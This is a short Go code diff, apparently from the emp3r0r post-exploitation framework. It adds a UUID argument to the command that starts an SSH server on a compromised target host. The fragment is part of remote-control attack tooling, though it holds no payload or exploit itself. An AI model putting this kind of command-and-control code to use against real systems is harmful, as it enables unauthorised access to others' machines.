@@ -9,6 +9,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/google/uuid"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -33,7 +34,7 @@ func SSHClient(shell, port string) (err error) {
 
 	if !exists {
 		// start sshd server on target
-		cmd := fmt.Sprintf("!sshd %s %s", shell, port)
+		cmd := fmt.Sprintf("!sshd %s %s %s", shell, port, uuid.NewString())
 		if shell != "bash" {
 			err = SendCmdToCurrentTarget(cmd)
 			if err != nil {
